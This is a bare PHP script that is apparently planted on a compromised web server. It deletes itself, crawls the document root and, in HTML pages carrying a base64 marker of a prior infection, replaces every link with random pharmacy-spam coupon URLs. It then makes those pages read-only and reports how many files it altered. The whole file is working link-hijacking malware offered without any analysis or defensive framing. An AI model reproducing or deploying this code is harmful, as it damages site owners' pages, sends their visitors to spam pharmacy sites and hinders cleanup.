<?php unlink(__FILE__); @ignore_user_abort (true);
//set_time_limit ( 666000 );



$x_domains = explode(',' ,  "rxpillperclick.shop/?coupon=VcnoKxm,pillperclick.shop/?coupon=OcidGgr,rxpillperclick.shop/?coupon=BxayZvs,rxpillperclick.shop/?coupon=NcfoKsc,pillperclick.shop/?coupon=JyrkVoh,pillperclick.shop/?coupon=TjacXxa,rxpillperclick.shop/?coupon=EtofWku,pillperclick.shop/?coupon=WatuEis,rxpillperclick.shop/?coupon=CfysFac,pillperclick.shop/?coupon=PexaHoh");

$server_domain = $_SERVER['HTTP_HOST'];

// ------------------------ links in all folders



$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

$links_replaced = 0;
$files_changed = 0;


$search_file = '.htaccess';
$replace_link = 'http://' . $x_domains[array_rand($x_domains)] . '/';

if (strpos($root,'/') !== false) {
$pathArr = explode("/", $root);
$path = '/' .  ltrim(rtrim($pathArr[1])) . '/';
}
else 
{
$pathArr = explode("\\", $root);
$path = '\\' .  ltrim(rtrim($pathArr[1])) . '\\';
}


//$root = rtrim(dirname($root, $up_dir));
//$root = rtrim(dirname($root));

echo  $root . '     ----  ' .   $path . PHP_EOL;


//searchDir($path);

$realpath = realpath($root);
//$realpath = ltrim(rtrim($path));


$fileObjects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realpath),
                 RecursiveIteratorIterator::SELF_FIRST);

foreach($fileObjects as $key => $object){
//    if($object->getFilename() === 'filename.png') {

if (strpos($object->getFilename(),'.html') !== false)  {
        
$fname = $object->getPathname() ;
//echo  $fname . PHP_EOL;

$orig_body = File_get_contents($fname);



$string = $orig_body;

preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $string, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER);
foreach (array_reverse($matches) as $match) {
$links_replaced++;
  $a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://') . $match[0][0].'">' . $match[0][0] . '</a>';
  $string = substr_replace($string, $replace_link, $match[0][1], strlen($match[0][0]));
}

$changed_body = $string;

$variant = 'var dvCountDown = document.getElementById';
$variant = 'aHR0cDovL3RvcGxpZmUudG9w';

if (strpos($changed_body, $variant) !== false) {
//echo $fname . PHP_EOL;
if (strlen($changed_body)>5) {
$files_changed++;
//echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;
chmod($fname, 0644);
//unlink($fname);
file_put_contents($fname, $changed_body);
$fp = fopen($fname , 'w');
fwrite($fp, $changed_body);
fclose($fp);
chmod($fname, 0444);
}
}




    }
}

echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 





